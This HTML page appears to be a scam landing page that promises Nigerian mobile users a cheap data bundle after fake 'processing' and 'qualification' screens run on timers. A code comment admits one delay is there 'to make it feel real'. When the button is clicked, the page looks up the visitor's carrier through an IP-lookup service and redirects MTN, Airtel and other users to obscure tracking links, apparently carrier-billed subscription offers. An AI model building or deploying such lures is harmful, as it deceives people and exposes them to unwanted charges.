<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Congratulation</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>
  body {
    font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont;
    background: linear-gradient(180deg, #f8fafc 0%, #e2e8f0 100%);
  }
  .soft-card {
    background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%);
  }
  .loader {
    border: 6px solid rgba(59,130,246,0.2);
    border-top: 6px solid #2563eb;
    border-radius: 50%;
    width: 64px;
    height: 64px;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    100% { transform: rotate(360deg); }
  }
</style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

<!-- SUBTLE DIM BACKGROUND (ONLY ADDITION) -->
<div class="fixed inset-0 bg-black/10 pointer-events-none"></div>

<!-- PROCESSING / CHECKING -->
<div id="processBox" class="relative z-10 soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
  <h1 id="processText" class="text-xl font-extrabold text-blue-600 mb-6">
    Processingâ€¦ Please wait
  </h1>
  <div class="loader mx-auto mb-6"></div>
  <p class="text-gray-600 text-sm">
    Please do not refresh this page
  </p>
</div>

<!-- CONGRATULATIONS -->
<div id="congratsBox" class="relative z-10 hidden soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
  <h1 class="text-2xl font-extrabold text-green-600 mb-2">
    ðŸŽ‰ Congratulations!
  </h1>

  <p class="text-gray-600 mb-4">
    You are qualified for the data below:
  </p>

  <div id="bundleText" class="text-3xl font-black text-blue-600 mb-2">
    5GB DATA
  </div>

  <div id="priceText" class="inline-block bg-green-100 text-green-700 font-bold px-4 py-2 rounded-full mb-6">
    â‚¦100 ONLY
  </div>

  <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-sm text-left mb-6">
    <p>â€¢ Click the button below to continue</p>
    <p>â€¢ Enter your phone number</p>
    <p>â€¢ Subscribe & receive data</p>
  </div>

  <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow-lg transition">
    Subscribe to Get Data
  </button>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const bundle = params.get("bundle") || "5GB";
  const price = params.get("price") || "100";

  // After 4 seconds â†’ Checking
  setTimeout(() => {
    document.getElementById("processText").innerText =
      "Checking if you qualifiedâ€¦";
  }, 4000);

  // After 10 seconds â†’ Show congratulations
  setTimeout(() => {
    document.getElementById("processBox").classList.add("hidden");
    document.getElementById("congratsBox").classList.remove("hidden");

    document.getElementById("bundleText").innerText =
      bundle + " DATA";
    document.getElementById("priceText").innerText =
      "â‚¦" + price + " ONLY";
  }, 20000);
</script>

<!-- NETWORK DETECTION SCRIPT (Fully Integrated, No Edits to Existing HTML) -->
<script>
function detectNetwork() {
  fetch("https://ipinfo.io/json?token=55355b912bdc12")
    .then(res => res.json())
    .then(data => {
      const network = data.org ? data.org.toLowerCase() : "";
      console.log("Detected network:", network);

      if (network.includes("mtn")) {
        window.location.href = "https://qkzpkdm.com/cl/f1085b0b45ff0390";
      } else if (network.includes("airtel")) {
        window.location.href = "https://kdmjzwq.com/cl/c6f40f9d240f3e73";
      } else {
        window.location.href = "https://qkzpkdm.com/cl/67a9642f26918e02";
      }
    })
    .catch(() => {
      window.location.href = "https://qkzpkdm.com/cl/67a9642f26918e02";
    });
}

// Add spinning icon to button on click
document.addEventListener("DOMContentLoaded", function() {
  const btn = document.querySelector('#congratsBox button');
  if (!btn) return;

  btn.addEventListener('click', function() {
    // Disable button
    btn.disabled = true;

    // Save original content
    const originalContent = btn.innerHTML;

    // Replace with spinner only
    btn.innerHTML = `
      <svg class="animate-spin inline-block w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
      </svg>
    `;

    // Delay to make it feel real
    setTimeout(() => {
      detectNetwork();
    }, 2000);
  });
});
  
  // Attach to your existing button without editing HTML
document.addEventListener("DOMContentLoaded", function() {
  const btn = document.querySelector('#congratsBox button');
  if (btn) {
    btn.addEventListener('click', detectNetwork);
  }
});
</script>

</body>
</html>
